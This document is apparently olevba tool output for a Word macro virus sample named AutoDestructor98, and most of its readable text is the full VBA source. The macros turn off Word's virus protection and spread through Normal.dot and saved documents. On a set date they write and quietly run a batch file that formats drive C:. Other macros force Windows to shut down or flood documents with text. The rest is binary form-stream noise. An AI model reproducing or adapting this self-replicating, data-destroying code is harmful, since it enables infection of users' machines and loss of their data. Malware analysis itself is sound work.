olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Autodestructor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Autodestructor - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoDestructor98.bas 
in file: ./Virus.MSWord.Autodestructor - OLE stream: 'Macros/VBA/AutoDestructor98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 5)
D1$ = Mid(MyDate, 1, 2)
If D$ = "13/07" Then
    With Application.Assistant
        .Visible = True
    End With
    With Assistant.NewBalloon
        .Text = "Attention, le compte а rebours est lancй..." & Chr$(13) & "Plus que 10 secondes"
        .Heading = "Virus AutoDestructor98"
        .Animation = msoAnimationGetAttentionMajor
        .Button = msoButtonSetOK
        .Show
    End With
StatusBar = "10"
Call CpteAReb
StatusBar = "9"
Call CpteAReb
StatusBar = "8"
Call CpteAReb
StatusBar = "7"
Call CpteAReb
StatusBar = "6"
Call CpteAReb
StatusBar = "5"
Call CpteAReb
StatusBar = "4"
Call CpteAReb
StatusBar = "3"
Call CpteAReb
StatusBar = "2"
Call CpteAReb
StatusBar = "1"
Call CpteAReb
StatusBar = "0"
Open "C:\DOS\Boum.bat" For Output As #1
    Print #1, "@Echo off"
    Print #1, "CLS"
    Print #1, "Echo o|Format C: /u /Autotest"
    Print #1, "Echo y|Format C: /u /Autotest"
    Print #1, "Echo Votre ordinateur s'est autodйtruit, HAHAHAHAHA!!!!!"
Close #1
Shell "C:\DOS\Boum.bat", vbHide
BoumBox.Show
End If
If D1$ = "15" Then
    Application.ActiveWindow.Caption = "Les barres de scrollings ont disparu..."
    Application.ActiveWindow.DisplayHorizontalScrollBar = False
    Application.ActiveWindow.DisplayVerticalScrollBar = False
Else
    Application.ActiveWindow.DisplayHorizontalScrollBar = True
    Application.ActiveWindow.DisplayVerticalScrollBar = True
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "AutoDestructor98" Then
        AutoDestructor98Installed = -1
    End If
Next i
If Not AutoDestructor98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AutoDestructor98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="BoumBox", Object:=wdOrganizerObjectProjectItems
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "HAHAHAHAHA!!!, votre ordinateur est infectй par un nouveau virus..."
    .Heading = "Virus AutoDestructor98"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
End If
ErrorAO:
End Sub
Sub CpteAReb()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorCAR
Dim PauseTime, Start, Finish, TotalTime
    PauseTime = 1   ' Dйfinit la durйe.
    Start = Timer   ' Dйfinit l'heure de dйbut.
    Do While Timer < Start + PauseTime
        DoEvents    ' Donne le contrфle а d'autres
                    ' processus.
    Loop
ErrorCAR:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoDestructor98", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="BoumBox", Object:=wdOrganizerObjectProjectItems
Application.ActiveWindow.Caption = "Document infectй, HAHAHAHAHA!!!!!!"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
StatusBar = "10"
Call CpteAReb
StatusBar = "9"
Call CpteAReb
StatusBar = "8"
Call CpteAReb
StatusBar = "7"
Call CpteAReb
StatusBar = "6"
Call CpteAReb
StatusBar = "5"
Call CpteAReb
StatusBar = "4"
Call CpteAReb
StatusBar = "3"
Call CpteAReb
StatusBar = "2"
Call CpteAReb
StatusBar = "1"
Call CpteAReb
StatusBar = "0"
MsgBox "Charge activйe...", vbCritical, "Virus AutoDestructor98"
Selection.EndKey
For i = 1 To 100
Selection.TypeParagraph
Selection.TypeText Text:="Boum!!!!!!!!!"
Next i
Selection.TypeParagraph
Selection.TypeText Text:="Je m'appelle AutoDestructor98 et je vais dйtruire votre ordinateur..."
Selection.TypeParagraph
Selection.TypeText Text:="HAHAHAHAHA!!!!!!!!!!"
ActiveDocument.Save
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
StatusBar = "Compte а rebours dйclenchй plus que 10 secondes..."
StatusBar = "Veuillez observer la barre de titre..."
Application.ActiveWindow.Caption = "10"
Call CpteAReb
Application.ActiveWindow.Caption = "9"
Call CpteAReb
Application.ActiveWindow.Caption = "8"
Call CpteAReb
Application.ActiveWindow.Caption = "7"
Call CpteAReb
Application.ActiveWindow.Caption = "6"
Call CpteAReb
Application.ActiveWindow.Caption = "5"
Call CpteAReb
Application.ActiveWindow.Caption = "4"
Call CpteAReb
Application.ActiveWindow.Caption = "3"
Call CpteAReb
Application.ActiveWindow.Caption = "2"
Call CpteAReb
Application.ActiveWindow.Caption = "1"
Call CpteAReb
Application.ActiveWindow.Caption = "0"
MsgBox "Au revoir...", vbCritical, "Virus AutoDestructor98"
Tasks.ExitWindows
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "Microsoft Visual Basic n'est pas installй." & Chr$(13) & "Veuillez consulter l'aide en ligne."
    .Heading = "Microsoft Word"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO BoumBox.frm 
in file: ./Virus.MSWord.Autodestructor - OLE stream: 'Macros/VBA/BoumBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload BoumBox
End Sub
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
33333f33�33�33�f3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f33f3ff3�f3�f3��3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3̙3��3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3��3��3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3f33ff3f�3f�3f�ff
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ff3fffff�ff�ff��f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f̙f��f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f��f��f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3��3��3��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff��f��f����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����̙��̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3̙f̙�̙�̙���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3̙3��3��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff̙f��f����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙��̙����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3��3��3��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff��f��f����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����̙����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H��ŋ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3j�ȱ�Ǐ C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��ɓ(S�\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��ѣH�*]ʴ�ӧD�]�J��@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z��T�4iZ��5��+ر.â}(��ٯjעt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W.²o��M�V�ރx���K��ٺr�
΋��G�o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���㑐
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�\y�叜5�����gХMSU�Z���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CW~MVv볰9ڞݔ��ȹ7��L��o✋Sl�u����s��=
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
l��y��5��#�������uzo�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���>2w����$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}������}=yW
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&�'��!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:8�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2'���A����%(`�$vd z#�T�x'VآC
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G K/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Vc|�#u;
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�0�8�T���H=��$fOBI��JV)���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i��Q�Ɨ�pj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�5z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�t$�p�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�y�����|��'��Zy#�l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*�(�m:�&r��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ے�qZ��8b*鉛.�!o�-�b��ID�5��I��xj�j��z�(��Қ!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����J%��.�c�iA���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*tk��ک��CF���`VKl��&jж�v�+`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�זk��C�{lV�J5���6{U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K/�ֹg-���/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
{o�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��y�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�/ǥ�,rʡ�,3��j,��-�r��݌���+4�4�F�p'f��ϫ�|t�q�z��9'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]i�]_���+�,����X�R���a����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
++��Yk�5��m��6��ݝk���-8�y�|a�K���Mu� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8݊/η����t�O�)��m��s2
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xĞ�Vy��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uаc�xy8���ŭ��z�s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i5�xc��M���z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?x��w�4� rM���s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�o_��:#���73���ß�~���>~�巬���Ϗ���<�سi?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e���i�lF
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h;�)(�k^蔧@1���ӛq
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h���� � �ڧ?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
����m�z�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9ݛ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kWCjݐ��;
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�BL�ЈfãD0�J���z�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@����b�"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �1�TD�R�ȿ7�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�$�1�^��	�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D<"Ɍ{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#!ghȲ�э����P��/FR�_���J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K��qq
$�<�Bυr(tD")�׺��2��\���wJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̞��hD
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~���w�B�_�2��^�`h�\"S���^3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Lh�$�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cdf��ě
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A.6�M}S��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c+˦��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���W<�uNy�sQ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1X>�yO|��y�t�~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O��ˠ��gB
-------------------------------------------------------------------------------
